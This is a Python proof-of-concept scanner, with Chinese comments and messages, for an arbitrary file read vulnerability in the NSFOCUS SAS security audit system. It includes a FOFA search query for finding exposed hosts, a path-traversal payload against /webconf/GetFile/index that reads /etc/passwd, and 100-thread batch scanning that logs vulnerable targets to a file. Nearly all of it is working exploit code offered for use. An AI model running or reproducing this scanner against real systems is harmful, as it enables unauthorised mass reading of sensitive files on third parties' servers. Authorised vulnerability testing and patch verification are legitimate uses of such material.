# 绿盟sas安全审计系统任意文件读取漏洞

#FOFA语法：title=“NSFOCUS SAS[H]”

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
  _                                                
 | |                                               
 | |_   ___ __ ___   ___ _ __   __ _ ___  __ _ ___ 
 | \ \ / / '_ ` _ \ / _ \ '_ \ / _` / __|/ _` / __|
 | |\ V /| | | | | |  __/ | | | (_| \__ \ (_| \__ \
 |_| \_/ |_| |_| |_|\___|_| |_|\__, |___/\__,_|___/
                                __/ |              
                               |___/               
                                                                                                                                                                                    
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="绿盟sas安全审计系统")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/webconf/GetFile/index?path=../../../../../../../....1../..1../../../etc/passwd'
    url = target + url_payload
    header = {
        'User-Agent':'Mozilla/4.0(compatible;MSIE8.0;Windows NT 6.1)',
        'Accept':'*/*',
        'Connection':'close',
        'Accept-Language':'en'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,verify=False)
        if res.status_code == 200 and "root" in res.text:
            print(f"f[+]该url存在任意文件读取漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件读取漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()